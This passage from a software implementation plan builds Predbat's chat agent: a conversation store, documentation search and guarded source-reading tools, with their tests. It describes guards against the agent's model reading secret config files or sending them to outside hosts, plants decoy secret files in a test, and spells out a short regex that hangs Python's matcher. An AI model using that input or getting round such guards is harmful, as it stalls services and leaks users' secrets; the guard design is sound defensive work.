    asyncio.run(store.load_index())

    ids = [asyncio.run(store.create()) for _ in range(BODY_CACHE_SIZE + 1)]
    asyncio.run(store.append(ids[0], {"role": "user", "content": "keep me"}))
    for cid in ids[1:]:
        asyncio.run(store.get_messages(cid))

    if ids[0] in store.bodies:
        print("ERROR: the oldest body was not evicted past the cache size")
        failed = True

    reloaded = asyncio.run(store.get_messages(ids[0]))
    if not reloaded or reloaded[-1].get("content") != "keep me":
        print("ERROR: the evicted body lost its unflushed message: {}".format(reloaded))
        failed = True

    return failed


def test_pruning(my_predbat):
    """Past the cap the least recently updated is marked deleted, never the protected one."""
    failed = False
    print("**** Testing conversation pruning ****")
    storage = FakeStorage()
    store = _store(storage, max_conversations=3)
    asyncio.run(store.load_index())

    ids = [asyncio.run(store.create()) for _ in range(3)]
    store.set_title(ids[0], "oldest")
    asyncio.run(store.create(protect_id=ids[0]))

    listed = [entry["id"] for entry in store.list_conversations()]
    if len(listed) > 3:
        print("ERROR: pruning left {} conversations, cap is 3".format(len(listed)))
        failed = True
    if ids[0] not in listed:
        print("ERROR: the protected conversation was pruned")
        failed = True
    if ids[1] in listed:
        print("ERROR: the least recently updated unprotected conversation survived pruning")
        failed = True

    return failed


def test_derive_title(my_predbat):
    """Titles collapse whitespace, truncate, and never come back empty."""
    failed = False
    print("**** Testing title derivation ****")
    cases = [
        ("  why   is it\ncharging at 3am? ", "why is it charging at 3am?"),
        ("x" * 200, "x" * TITLE_MAX_LENGTH),
        ("", NEW_CONVERSATION_TITLE),
        ("   ", NEW_CONVERSATION_TITLE),
    ]
    for text, expected in cases:
        got = derive_title(text)
        if got != expected:
            print("ERROR: derive_title({!r}) returned {!r}, expected {!r}".format(text, got, expected))
            failed = True
        if len(got) > TITLE_MAX_LENGTH:
            print("ERROR: derive_title({!r}) exceeded the length cap".format(text))
            failed = True
    return failed


def test_trim_history_keeps_tool_groups_intact(my_predbat):
    """Trimming never leaves a tool message without the assistant tool_calls that asked for it."""
    failed = False
    print("**** Testing history trimming ****")
    messages = [
        {"role": "user", "content": "one"},
        {"role": "assistant", "content": "first answer"},
        {"role": "user", "content": "two"},
        {"role": "assistant", "content": None, "tool_calls": [{"id": "call_a", "type": "function", "function": {"name": "get_plan", "arguments": "{}"}}]},
        {"role": "tool", "tool_call_id": "call_a", "content": "{}"},
        {"role": "assistant", "content": "second answer"},
    ]

    trimmed = trim_history(messages, 3)
    if trimmed and trimmed[0].get("role") != "user":
        print("ERROR: trimmed history starts with {!r}, not a user message".format(trimmed[0].get("role")))
        failed = True

    ids = {message["tool_calls"][0]["id"] for message in trimmed if message.get("tool_calls")}
    answered = {message["tool_call_id"] for message in trimmed if message.get("role") == "tool"}
    if answered - ids:
        print("ERROR: orphaned tool results in the trimmed window: {}".format(answered - ids))
        failed = True

    if trim_history(messages, 99) != messages:
        print("ERROR: trimming below the cap changed the conversation")
        failed = True

    no_boundary = [{"role": "assistant", "content": str(index)} for index in range(10)]
    if trim_history(no_boundary, 3) != no_boundary:
        print("ERROR: a window with no user boundary should keep the whole conversation")
        failed = True

    return failed


def run_chat_store_tests(my_predbat):
    """Run every conversation store test, returning True if any of them failed."""
    failed = False
    failed |= test_create_and_list(my_predbat)
    failed |= test_expiry_is_rolling(my_predbat)
    failed |= test_delete_is_a_flag(my_predbat)
    failed |= test_index_self_heals(my_predbat)
    failed |= test_unknown_version_discarded(my_predbat)
    failed |= test_lru_flushes_before_eviction(my_predbat)
    failed |= test_pruning(my_predbat)
    failed |= test_derive_title(my_predbat)
    failed |= test_trim_history_keeps_tool_groups_intact(my_predbat)
    return failed
```

- [ ] **Step 2: Register the test**

In `apps/predbat/unit_test.py`, add beside the other `from tests.` imports:

```python
from tests.test_chat_store import run_chat_store_tests
```

and to `TEST_REGISTRY`, after the `("agent_tools", ...)` entry:

```python
        ("chat_store", run_chat_store_tests, "Chat conversation store tests (expiry, deletion, LRU, trimming)", False),
```

- [ ] **Step 3: Run the test to verify it fails**

```bash
cd /Users/treforsouthwell/predbat/batpred/coverage
./run_all --test chat_store > /tmp/chat_store_1.txt 2>&1; grep -iE "error|traceback|failed" /tmp/chat_store_1.txt | head -20
```

Expected: FAIL with `ModuleNotFoundError: No module named 'chat_store'`.

- [ ] **Step 4: Write `chat_store.py`**

Create `apps/predbat/chat_store.py` with the house header and:

```python
"""Conversation storage for the Predbat chat agent.

Holds many conversations as an index plus one body per conversation, so a turn rewrites only what
it touched. Every save carries a rolling expiry, which is also how deletion works: Storage has no
delete operation, so a deleted conversation is flagged, stops being re-saved, and ages out.

Deliberately free of asyncio primitives - the agent turn runs on the web component's event loop
while the owning component's thread flushes on its own, so all shared state is guarded by a
threading.Lock instead. See spec section 3.
"""

import json
import secrets
import threading
from collections import OrderedDict
from datetime import datetime, timedelta, timezone

CONVERSATION_VERSION = 1
STORAGE_MODULE = "chat"
INDEX_FILENAME = "index"
BODY_CACHE_SIZE = 5
TITLE_MAX_LENGTH = 60
NEW_CONVERSATION_TITLE = "New chat"


def derive_title(text):
    """Turn a message into a conversation title: whitespace collapsed, truncated, never empty."""
    collapsed = " ".join(str(text or "").split())
    if not collapsed:
        return NEW_CONVERSATION_TITLE
    return collapsed[:TITLE_MAX_LENGTH]


def trim_history(messages, max_history, log=None):
    """Return the tail of a conversation, cut only at a user message boundary.

    Cutting anywhere else eventually splits an assistant message carrying tool_calls from the
    tool messages answering them, and an OpenAI-compatible API rejects that whole request with a
    400 - every tool_call_id must have its tool reply present. Walking back to a user message
    can keep slightly more than max_history, which is the right trade: the cap exists to bound
    cost, and a few extra messages is cheaper than a failed turn.
    """
    if len(messages) <= max_history:
        return list(messages)
    index = len(messages) - max_history
    while index >= 0 and messages[index].get("role") != "user":
        index -= 1
    if index < 0:
        if log:
            log("Warn: chat history has no user boundary within the last {} messages, keeping the whole conversation".format(max_history))
        return list(messages)
    return messages[index:]


class ConversationStore:
    """Index, bodies and persistence for the chat agent's conversations."""

    def __init__(self, storage, log, max_history=40, max_conversations=20, expiry_days=30):
        """Bind the store to a Storage component and its limits."""
        self.storage = storage
        self.log = log
        self.max_history = max_history
        self.max_conversations = max_conversations
        self.expiry_days = expiry_days
        self.index = OrderedDict()
        self.bodies = OrderedDict()
        self.dirty = set()
        self.lock = threading.Lock()
        self.loaded = False

    def _expiry(self):
        """Return the timezone-aware expiry a save should carry."""
        return datetime.now(timezone.utc) + timedelta(days=self.expiry_days)

    def _body_name(self, cid):
        """Return the storage filename for a conversation body."""
        return "conv_{}".format(cid)

    async def load_index(self):
        """Load the conversation index, dropping entries whose body has expired or vanished."""
        payload = await self.storage.load(STORAGE_MODULE, INDEX_FILENAME) if self.storage else None
        entries = []
        if isinstance(payload, dict):
            if payload.get("version") != CONVERSATION_VERSION:
                self.log("Warn: chat index version {} is not {}, discarding it".format(payload.get("version"), CONVERSATION_VERSION))
            else:
                entries = payload.get("conversations") or []

        healed = False
        with self.lock:
            self.index = OrderedDict()
            for entry in entries:
                cid = entry.get("id")
                if not cid:
                    continue
                self.index[cid] = entry
            self.loaded = True

        for cid in list(self.index.keys()):
            if self.index[cid].get("deleted"):
                continue
            body = await self.storage.load(STORAGE_MODULE, self._body_name(cid)) if self.storage else None
            if body is None or body.get("version") != CONVERSATION_VERSION:
                self.log("Info: chat conversation {} has expired or is unreadable, dropping it from the index".format(cid))
                with self.lock:
                    self.index.pop(cid, None)
                healed = True

        if healed:
            await self._save_index()
        return True

    def list_conversations(self):
        """Return metadata for every conversation the user can see, newest first."""
        with self.lock:
            live = [dict(entry) for entry in self.index.values() if not entry.get("deleted")]
        return sorted(live, key=lambda entry: entry.get("updated") or "", reverse=True)

    def get_meta(self, cid):
        """Return one conversation's metadata, or None if it is unknown or deleted."""
        with self.lock:
            entry = self.index.get(cid)
            if entry is None or entry.get("deleted"):
                return None
            return dict(entry)

    async def create(self, model=None, protect_id=None):
        """Create a conversation, prune past the cap, and return the new id."""
        now = datetime.now(timezone.utc).isoformat()
        cid = secrets.token_hex(8)
        entry = {"id": cid, "title": NEW_CONVERSATION_TITLE, "created": now, "updated": now, "deleted": False, "model": model, "message_count": 0, "usage_total": {"prompt_tokens": 0, "completion_tokens": 0, "cost": 0.0}}
        with self.lock:
            self.index[cid] = entry
            self.dirty.add(cid)
        await self._cache_body(cid, [])
        await self._prune(protect_id=protect_id)
        await self.flush(cid)
        return cid

    async def get_messages(self, cid):
        """Return a conversation's messages, loading and caching the body if needed."""
        with self.lock:
            if cid in self.bodies:
                self.bodies.move_to_end(cid)
                return self.bodies[cid]
            if self.index.get(cid) is None or self.index[cid].get("deleted"):
                return None

        payload = await self.storage.load(STORAGE_MODULE, self._body_name(cid)) if self.storage else None
        messages = payload.get("messages", []) if isinstance(payload, dict) and payload.get("version") == CONVERSATION_VERSION else []
        await self._cache_body(cid, messages)
        return messages

    async def _cache_body(self, cid, messages):
        """Put a body in the LRU, evicting the least recently used once the cache is full.

        Eviction candidates are collected under the lock but flushed outside it - _save_body is a
        coroutine that takes the same lock, and awaiting while holding it would deadlock.
        """
        evicted = []
        with self.lock:
            self.bodies[cid] = messages
            self.bodies.move_to_end(cid)
            while len(self.bodies) > BODY_CACHE_SIZE:
                victim = next(iter(self.bodies))
                if victim == cid:
                    break
                evicted.append((victim, self.bodies.pop(victim), victim in self.dirty))
        for victim, payload, was_dirty in evicted:
            if was_dirty:
                await self._save_body(victim, messages=payload, evicted=True)

    async def append(self, cid, message):
        """Append a message to a conversation and mark it dirty."""
        messages = await self.get_messages(cid)
        if messages is None:
            return False
        with self.lock:
            messages.append(message)
            entry = self.index.get(cid)
            if entry is not None:
                entry["message_count"] = len(messages)
                entry["updated"] = datetime.now(timezone.utc).isoformat()
            self.dirty.add(cid)
        return True

    def set_title(self, cid, title):
        """Set a conversation's title, returning the stored value."""
        cleaned = derive_title(title)
        with self.lock:
            entry = self.index.get(cid)
            if entry is None or entry.get("deleted"):
                return None
            entry["title"] = cleaned
            entry["updated"] = datetime.now(timezone.utc).isoformat()
            self.dirty.add(cid)
        return cleaned

    def rename(self, cid, title):
        """Rename a conversation - the same operation a user drives from the list."""
        return self.set_title(cid, title)

    def set_model(self, cid, model):
        """Set a conversation's model override, or clear it back to the default with None."""
        with self.lock:
            entry = self.index.get(cid)
            if entry is None or entry.get("deleted"):
                return False
            entry["model"] = model
            self.dirty.add(cid)
        return True

    def add_usage(self, cid, usage):
        """Accumulate token and cost usage onto a conversation."""
        with self.lock:
            entry = self.index.get(cid)
            if entry is None:
                return
            total = entry.setdefault("usage_total", {"prompt_tokens": 0, "completion_tokens": 0, "cost": 0.0})
            for key in ("prompt_tokens", "completion_tokens", "cost"):
                total[key] = total.get(key, 0) + (usage.get(key) or 0)
            self.dirty.add(cid)

    async def delete(self, cid):
        """Hide a conversation and stop renewing it, so its stored body expires on its own."""
        with self.lock:
            entry = self.index.get(cid)
            if entry is None or entry.get("deleted"):
                return False
            entry["deleted"] = True
            self.bodies.pop(cid, None)
            self.dirty.discard(cid)
        await self._save_index()
        return True

    async def _prune(self, protect_id=None):
        """Mark the least recently updated conversations deleted once past the cap."""
        with self.lock:
            live = [entry for entry in self.index.values() if not entry.get("deleted")]
            surplus = len(live) - self.max_conversations
            if surplus <= 0:
                return
            candidates = sorted((entry for entry in live if entry["id"] != protect_id), key=lambda entry: entry.get("updated") or "")
            doomed = candidates[:surplus]
            for entry in doomed:
                entry["deleted"] = True
                self.bodies.pop(entry["id"], None)
                self.dirty.discard(entry["id"])
        for entry in doomed:
            self.log("Info: chat conversation '{}' ({}) pruned past the {} conversation limit; its stored copy expires in {} days".format(entry.get("title"), entry["id"], self.max_conversations, self.expiry_days))
        await self._save_index()

    async def _save_index(self):
        """Write the conversation index with a renewed expiry."""
        if not self.storage:
            return False
        with self.lock:
            payload = {"version": CONVERSATION_VERSION, "conversations": [dict(entry) for entry in self.index.values()]}
        return await self.storage.save(STORAGE_MODULE, INDEX_FILENAME, payload, format="json", expiry=self._expiry())

    async def _save_body(self, cid, messages=None, evicted=False):
        """Write one conversation body with a renewed expiry."""
        if not self.storage:
            return False
        with self.lock:
            entry = self.index.get(cid)
            if entry is None or entry.get("deleted"):
                return False
            if messages is None:
                messages = self.bodies.get(cid, [])
            payload = {"version": CONVERSATION_VERSION, "id": cid, "messages": json.loads(json.dumps(messages))}
            self.dirty.discard(cid)
        result = await self.storage.save(STORAGE_MODULE, self._body_name(cid), payload, format="json", expiry=self._expiry())
        if evicted:
            self.log("Info: flushed chat conversation {} before evicting it from the body cache".format(cid))
        return result

    async def flush(self, cid=None):
        """Write any dirty conversations and the index."""
        with self.lock:
            targets = [cid] if cid is not None else sorted(self.dirty)
        wrote = False
        for target in targets:
            if await self._save_body(target):
                wrote = True
        await self._save_index()
        return wrote
```

- [ ] **Step 5: Run the test to verify it passes**

```bash
cd /Users/treforsouthwell/predbat/batpred/coverage
./run_all --test chat_store > /tmp/chat_store_2.txt 2>&1; grep -iE "error|traceback|failed|Result" /tmp/chat_store_2.txt | head -30
```

Expected: PASS, with no `ERROR:` lines in the output.

- [ ] **Step 6: Commit**

```bash
cd /Users/treforsouthwell/predbat/batpred
git add apps/predbat/chat_store.py apps/predbat/tests/test_chat_store.py apps/predbat/unit_test.py
./run_pre_commit
git add -A apps/predbat .cspell
git commit -m "feat(chat): add the conversation store

Index plus one body per conversation through the Storage component, so a
turn rewrites only what it touched. Every save carries a rolling expiry,
which is also how deletion works: Storage has no delete operation, so a
deleted conversation is flagged, stops being renewed, and ages out.

History trimming cuts only at a user message boundary - anywhere else
eventually splits an assistant tool_calls message from its tool replies,
which an OpenAI-compatible API rejects outright."
```

---

## Task 3: Chat-only tool definitions and documentation search

**Files:**
- Create: `apps/predbat/chat_tools.py`
- Create: `apps/predbat/tests/test_chat_tools.py`
- Modify: `apps/predbat/unit_test.py`

**Interfaces:**
- Consumes: `agent_tools.openai_tool_list(defs)` from Task 1; `StorageComponent.fetch_cached(module, filename, fetch_fn, fresh_minutes=, stale_minutes=, format=)` from `apps/predbat/storage.py:466`.
- Produces:
  - `chat_tools.CHAT_TOOL_DEFS: list[dict]` — five entries in the same shape as `TOOL_DEFS`.
  - `chat_tools.DOCS_INDEX_URL`, `chat_tools.DOCS_SITE_ROOT`
  - `async chat_tools.search_docs(storage, query, max_results=5) -> dict`
  - `chat_tools.score_documents(documents, query, max_results) -> list[dict]` (pure, no I/O)

- [ ] **Step 1: Write the failing test**

Create `apps/predbat/tests/test_chat_tools.py` with the house header, then:

```python
"""Tests for the chat agent's own tools: documentation search, source access and URL fetch.

The source and fetch guards are the security surface of the whole feature - the source tools are
what stop a model reading apps.yaml off disk, and the fetch allowlist is what stops it posting
what it read to an address of its choosing. Those tests are the point of this file.
"""

import asyncio

import chat_tools
from chat_tools import CHAT_TOOL_DEFS, score_documents, search_docs
from agent_tools import openai_tool_list

SAMPLE_DOCS = [
    {"location": "customisation/", "title": "Customisation", "text": "The best_soc_keep setting reserves battery capacity for unexpected load. Raise it if you run out overnight."},
    {"location": "energy-rates/", "title": "Energy rates", "text": "Octopus Agile rates are fetched every thirty minutes and used to plan charging windows."},
    {"location": "faq/", "title": "FAQ", "text": "Why is my battery charging at 3am? Usually because the overnight rate is the cheapest in the plan."},
]


class FakeCachedStorage:
    """A storage stand-in whose fetch_cached calls the fetch function at most once."""

    def __init__(self, payload=None, fail=False):
        """Hold the payload fetch_cached should return, or arrange for a failure."""
        self.payload = payload
        self.fail = fail
        self.calls = 0

    async def fetch_cached(self, module, filename, fetch_fn, fresh_minutes=30, stale_minutes=35, format="yaml"):
        """Return the cached payload, counting how many times a real fetch would have happened."""
        self.calls += 1
        if self.fail:
            return None
        return self.payload


def test_chat_tool_defs_shape(my_predbat):
    """CHAT_TOOL_DEFS holds the five chat-only tools, none of them flagged as Predbat writes."""
    failed = False
    print("**** Testing CHAT_TOOL_DEFS shape ****")
    names = [entry["name"] for entry in CHAT_TOOL_DEFS]
    expected = ["set_chat_title", "search_docs", "search_source", "read_source", "fetch_url"]
    if names != expected:
        print("ERROR: CHAT_TOOL_DEFS names are {}, expected {}".format(names, expected))
        failed = True

    for entry in CHAT_TOOL_DEFS:
        if entry.get("writes"):
            print("ERROR: {} is flagged as a Predbat write, so it would hit the confirmation gate".format(entry["name"]))
            failed = True
        for field in ("name", "description", "parameters"):
            if field not in entry:
                print("ERROR: {} is missing '{}'".format(entry.get("name"), field))
                failed = True

    projected = openai_tool_list(CHAT_TOOL_DEFS)
    if len(projected) != len(CHAT_TOOL_DEFS):
        print("ERROR: openai_tool_list(CHAT_TOOL_DEFS) returned {} entries".format(len(projected)))
        failed = True

    return failed


def test_score_documents(my_predbat):
    """Scoring ranks by term overlap, weights the title, and respects max_results."""
    failed = False
    print("**** Testing documentation scoring ****")

    results = score_documents(SAMPLE_DOCS, "why is my battery charging at 3am", max_results=2)
    if not results:
        print("ERROR: scoring returned nothing for an obvious query")
        failed = True
    elif results[0]["url"] != chat_tools.DOCS_SITE_ROOT + "faq/":
        print("ERROR: top hit was {}, expected the FAQ page".format(results[0]["url"]))
        failed = True
    if len(results) > 2:
        print("ERROR: max_results was ignored, got {} results".format(len(results)))
        failed = True

    titled = score_documents(SAMPLE_DOCS, "customisation", max_results=3)
    if not titled or titled[0]["title"] != "Customisation":
        print("ERROR: a title match did not rank first: {}".format(titled))
        failed = True

    for result in results:
        for field in ("title", "url", "excerpt"):
            if field not in result:
                print("ERROR: result is missing '{}': {}".format(field, result))
                failed = True
        if len(result.get("excerpt", "")) > 400:
            print("ERROR: excerpt is {} characters, longer than the cap".format(len(result["excerpt"])))
            failed = True

    if score_documents(SAMPLE_DOCS, "zz", max_results=3):
        print("ERROR: a query of only short terms should match nothing")
        failed = True

    return failed


def test_search_docs_uses_the_cache(my_predbat):
    """search_docs goes through fetch_cached and reports a clean error when the index is missing."""
    failed = False
    print("**** Testing search_docs caching and failure ****")

    storage = FakeCachedStorage(payload={"config": {}, "docs": SAMPLE_DOCS})
    first = asyncio.run(search_docs(storage, "best_soc_keep"))
    if not first.get("success") or not first.get("data"):
        print("ERROR: search_docs failed on a good index: {}".format(first))
        failed = True

    second = asyncio.run(search_docs(storage, "octopus agile"))
    if not second.get("success"):
        print("ERROR: second search_docs call failed: {}".format(second))
        failed = True

    missing = asyncio.run(search_docs(FakeCachedStorage(fail=True), "anything"))
    if missing.get("success") or "unavailable" not in str(missing.get("error", "")).lower():
        print("ERROR: an unfetchable index should return a clean error, got {}".format(missing))
        failed = True

    clamped = asyncio.run(search_docs(storage, "rates", max_results=999))
    if len(clamped.get("data") or []) > 10:
        print("ERROR: max_results was not clamped to 10")
        failed = True

    return failed


def run_chat_tools_tests(my_predbat):
    """Run every chat-only tool test, returning True if any of them failed."""
    failed = False
    failed |= test_chat_tool_defs_shape(my_predbat)
    failed |= test_score_documents(my_predbat)
    failed |= test_search_docs_uses_the_cache(my_predbat)
    return failed
```

- [ ] **Step 2: Register the test**

In `apps/predbat/unit_test.py`, add beside the other `from tests.` imports:

```python
from tests.test_chat_tools import run_chat_tools_tests
```

and to `TEST_REGISTRY`, after the `("chat_store", ...)` entry:

```python
        ("chat_tools", run_chat_tools_tests, "Chat agent docs search, source access and URL fetch guard tests", False),
```

- [ ] **Step 3: Run the test to verify it fails**

```bash
cd /Users/treforsouthwell/predbat/batpred/coverage
./run_all --test chat_tools > /tmp/chat_tools_1.txt 2>&1; grep -iE "error|traceback|failed" /tmp/chat_tools_1.txt | head -20
```

Expected: FAIL with `ModuleNotFoundError: No module named 'chat_tools'`.

- [ ] **Step 4: Create `chat_tools.py` with the definitions and documentation search**

Create `apps/predbat/chat_tools.py` with the house header and:

```python
"""Tools the chat agent has that the MCP server does not.

Two of them are about the conversation and Predbat's own documentation; three reach outside the
process, and those carry the guards. set_chat_title is declared here but handled in chat.py,
because it needs the conversation the turn belongs to and nothing in this module does.
"""

import aiohttp
import json
import re
from urllib.parse import urljoin

DOCS_SITE_ROOT = "https://springfall2008.github.io/batpred/"
DOCS_INDEX_URL = DOCS_SITE_ROOT + "search/search_index.json"
DOCS_CACHE_MINUTES = 1440
DOCS_MIN_TERM_LENGTH = 3
DOCS_TITLE_WEIGHT = 5
DOCS_EXCERPT_RADIUS = 150
DOCS_MAX_RESULTS = 10


CHAT_TOOL_DEFS = [
    {
        "name": "set_chat_title",
        "description": "Set the title of the current conversation. Call this once, early, when the conversation is still called 'New chat'.",
        "parameters": {"type": "object", "properties": {"title": {"type": "string", "description": "A short descriptive title of at most 60 characters"}}, "required": ["title"]},
        "writes": False,
        "chat_omit_properties": [],
    },
    {
        "name": "search_docs",
        "description": "Search the Predbat documentation and return matching pages with links and excerpts. Use this to answer questions about how to configure Predbat.",
        "parameters": {"type": "object", "properties": {"query": {"type": "string", "description": "What to search for"}, "max_results": {"type": "integer", "description": "Maximum pages to return (default 5, maximum 10)"}}, "required": ["query"]},
        "writes": False,
        "chat_omit_properties": [],
    },
    {
        "name": "search_source",
        "description": "Search Predbat's own installed source code with a Python regular expression. This is the exact version that is running. Search first, then read_source the interesting part.",
        "parameters": {"type": "object", "properties": {"pattern": {"type": "string", "description": "Python regular expression to search for, case-insensitive"}, "file": {"type": "string", "description": "Restrict the search to this file, relative to the install directory (optional)"}, "max_results": {"type": "integer", "description": "Maximum matches to return (default 20, maximum 100)"}}, "required": ["pattern"]},
        "writes": False,
        "chat_omit_properties": [],
    },
    {
        "name": "read_source",
        "description": "Read a numbered slice of one Predbat source file. Files are large, so read the part search_source pointed at rather than starting at line 1.",
        "parameters": {"type": "object", "properties": {"file": {"type": "string", "description": "Path relative to the install directory, for example 'plan.py'"}, "start_line": {"type": "integer", "description": "First line to return, 1-based (default 1)"}, "max_lines": {"type": "integer", "description": "Lines to return (default 200, maximum 400)"}}, "required": ["file"]},
        "writes": False,
        "chat_omit_properties": [],
    },
    {
        "name": "fetch_url",
        "description": "Fetch a web page as text. Only a small allowlist of hosts is reachable - the Predbat documentation site and GitHub.",
        "parameters": {"type": "object", "properties": {"url": {"type": "string", "description": "The https URL to fetch"}}, "required": ["url"]},
        "writes": False,
        "chat_omit_properties": [],
    },
]


def _query_terms(query):
    """Split a query into the lowercase terms worth matching on."""
    return [term for term in re.split(r"[^a-zA-Z0-9_]+", str(query or "").lower()) if len(term) >= DOCS_MIN_TERM_LENGTH]


def _excerpt(text, terms):
    """Return a short window of text around the first matching term."""
    lowered = text.lower()
    position = -1
    for term in terms:
        found = lowered.find(term)
        if found >= 0 and (position < 0 or found < position):
            position = found
    if position < 0:
        return text[: DOCS_EXCERPT_RADIUS * 2].strip()
    start = max(0, position - DOCS_EXCERPT_RADIUS)
    end = min(len(text), position + DOCS_EXCERPT_RADIUS)
    return ("..." if start > 0 else "") + text[start:end].strip() + ("..." if end < len(text) else "")


def score_documents(documents, query, max_results=5):
    """Rank MkDocs index records against a query by term overlap, title matches weighted."""
    terms = _query_terms(query)
    if not terms:
        return []
    scored = []
    for document in documents or []:
        title = str(document.get("title") or "")
        text = str(document.get("text") or "")
        haystack = text.lower()
        title_lower = title.lower()
        score = 0
        for term in terms:
            score += haystack.count(term)
            score += title_lower.count(term) * DOCS_TITLE_WEIGHT
        if score:
            scored.append({"score": score, "title": title, "url": urljoin(DOCS_SITE_ROOT, str(document.get("location") or "")), "excerpt": _excerpt(text, terms)})
    scored.sort(key=lambda entry: entry["score"], reverse=True)
    for entry in scored:
        entry.pop("score", None)
    return scored[: max(1, min(int(max_results or 5), DOCS_MAX_RESULTS))]


async def _fetch_docs_index():
    """Download the published MkDocs search index."""
    timeout = aiohttp.ClientTimeout(total=30)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        async with session.get(DOCS_INDEX_URL) as response:
            if response.status != 200:
                return None
            return json.loads(await response.text())


async def search_docs(storage, query, max_results=5):
    """Search the Predbat documentation, using a once-a-day cached copy of the search index."""
    payload = None
    if storage:
        payload = await storage.fetch_cached("chat", "docs_index", _fetch_docs_index, fresh_minutes=DOCS_CACHE_MINUTES, stale_minutes=DOCS_CACHE_MINUTES + 60, format="json")
    if not isinstance(payload, dict) or not payload.get("docs"):
        return {"success": False, "error": "Documentation index unavailable", "data": None}
    return {"success": True, "error": None, "data": score_documents(payload.get("docs"), query, max_results=max_results), "description": "Predbat documentation pages matching the query"}
```

- [ ] **Step 5: Run the test to verify it passes**

```bash
cd /Users/treforsouthwell/predbat/batpred/coverage
./run_all --test chat_tools > /tmp/chat_tools_2.txt 2>&1; grep -iE "ERROR|traceback|failed|Result" /tmp/chat_tools_2.txt | head -30
```

Expected: PASS with no `ERROR:` lines.

- [ ] **Step 6: Commit**

```bash
cd /Users/treforsouthwell/predbat/batpred
git add apps/predbat/chat_tools.py apps/predbat/tests/test_chat_tools.py apps/predbat/unit_test.py
./run_pre_commit
git add -A apps/predbat .cspell
git commit -m "feat(chat): add chat-only tool definitions and documentation search

Documentation is searched over the published MkDocs index rather than
shipped with the installer: scoring happens locally against a copy
cached once a day, so it costs no third-party search service and works
whatever openrouter_base_url points at."
```

---

## Task 4: Source search and read

The extension allowlist here is a security control, not tidiness. `CONFIG_ROOTS` is
`["/config", "/conf", "/homeassistant", "./"]` (`apps/predbat/const.py:33`), so `config_root`
falls back to the working directory, and `StorageLocalFiles` puts its cache at
`config_root/cache` (`apps/predbat/storage.py:199`). On a Docker or from-source run the token
cache, `apps.yaml` and `predbat.log` all sit inside the tree being searched. A directory rule
cannot exclude them; the extension allowlist can.

`search_source` and `read_source` are deliberately plain synchronous functions: they are far
easier to test that way, and `os.walk` has no async equivalent worth having. They are called
from a turn, which runs on the chat component's own loop — a loop whose only other job is a
five-second housekeeping tick, so a scan stalling it briefly costs nothing a user can see. The
web server is a different loop in a different thread, and the SSE stream reads the event buffer
through a `threading.Lock` rather than through this loop.

`SOURCE_SCAN_SECONDS` bounds a *slow* scan, not an adversarial one, and the elapsed check must
run inside the per-line loop as well as between files — between files alone bounds nothing when
one file is large. Even then, Python's `re` backtracks with no timeout: `(.*)*x` is seven
characters, well inside the 200-character pattern limit, and hangs inside a single `search()`
call that no elapsed check can interrupt. Nothing in this function can fix that. The containment
lives at the call site — Task 7 runs `search_source` on a worker thread so a pathological pattern
burns that thread instead of the component's only event loop.

**Files:**
- Modify: `apps/predbat/chat_tools.py`
- Modify: `apps/predbat/tests/test_chat_tools.py`

**Interfaces:**
- Consumes: `chat_tools` from Task 3.
- Produces:
  - `chat_tools.SOURCE_EXTENSIONS = (".py", ".cpp", ".h", ".hpp", ".proto", ".sh", ".md")`
  - `chat_tools.SOURCE_SKIP_DIRS`, `SOURCE_MAX_RESULTS = 100`, `SOURCE_MAX_LINES = 400`, `SOURCE_MAX_BYTES = 65536`, `SOURCE_PATTERN_MAX = 200`, `SOURCE_SCAN_SECONDS = 5.0`
  - `chat_tools.source_root() -> str`
  - `chat_tools.resolve_source_path(relative, root=None) -> str` — raises `SourceAccessError`
  - `chat_tools.SourceAccessError(ValueError)`
  - `chat_tools.search_source(pattern, file=None, max_results=20, root=None) -> dict`
  - `chat_tools.read_source(file, start_line=1, max_lines=200, root=None) -> dict`

- [ ] **Step 1: Write the failing tests**

Append to `apps/predbat/tests/test_chat_tools.py`, and add `import os`, `import shutil`, `import tempfile` to its imports plus `from chat_tools import read_source, search_source, resolve_source_path, SourceAccessError`:

```python
def _make_source_tree():
    """Build a throwaway source tree with the decoy files a real install can contain."""
    root = tempfile.mkdtemp(prefix="predbat_src_")
    with open(os.path.join(root, "plan.py"), "w", encoding="utf-8") as handle:
        handle.write("def calculate_plan(self):\n    # marker_symbol lives here\n    return True\n" + "# filler\n" * 50)
    with open(os.path.join(root, "prediction_kernel.cpp"), "w", encoding="utf-8") as handle:
        handle.write("// marker_symbol in C++\nint main() { return 0; }\n")
    with open(os.path.join(root, "predbat.log"), "w", encoding="utf-8") as handle:
        handle.write("2026-08-27: marker_symbol should never be reachable\n")
    with open(os.path.join(root, "apps.yaml"), "w", encoding="utf-8") as handle:
        handle.write("octopus_api_key: sk-marker_symbol-secret\n")
    with open(os.path.join(root, "secrets.yaml"), "w", encoding="utf-8") as handle:
        handle.write("ha_key: marker_symbol\n")
    with open(os.path.join(root, "old_plan.py.bak"), "w", encoding="utf-8") as handle:
        handle.write("marker_symbol in a backup\n")
    with open(os.path.join(root, "kernel.so"), "wb") as handle:
        handle.write(b"\x7fELF marker_symbol")
    os.makedirs(os.path.join(root, "cache"), exist_ok=True)
    with open(os.path.join(root, "cache", "chat_token.json"), "w", encoding="utf-8") as handle:
        handle.write('{"access_token": "marker_symbol"}')
    os.makedirs(os.path.join(root, "venv", "lib"), exist_ok=True)
    with open(os.path.join(root, "venv", "lib", "dependency.py"), "w", encoding="utf-8") as handle:
        handle.write("marker_symbol from a dependency\n")
    os.makedirs(os.path.join(root, "__pycache__"), exist_ok=True)
    with open(os.path.join(root, "__pycache__", "cached.py"), "w", encoding="utf-8") as handle:
        handle.write("marker_symbol from a cache\n")
    return root


def test_search_source(my_predbat):
    """search_source finds real source, skips dependencies and caches, and reports truncation."""
    failed = False
    print("**** Testing search_source ****")
    root = _make_source_tree()
    try:
        result = search_source("marker_symbol", root=root)
        if not result.get("success"):
            print("ERROR: search_source failed: {}".format(result.get("error")))
            failed = True
        files = {hit["file"] for hit in result.get("data") or []}
        if "plan.py" not in files:
            print("ERROR: search_source missed plan.py, found {}".format(files))
            failed = True
        if "prediction_kernel.cpp" not in files:
            print("ERROR: search_source missed the C++ file, found {}".format(files))
            failed = True

        forbidden = {"predbat.log", "apps.yaml", "secrets.yaml", "old_plan.py.bak", "kernel.so", os.path.join("cache", "chat_token.json"), os.path.join("venv", "lib", "dependency.py"), os.path.join("__pycache__", "cached.py")}
        leaked = files & forbidden
        if leaked:
            print("ERROR: search_source reached files it must never read: {}".format(leaked))
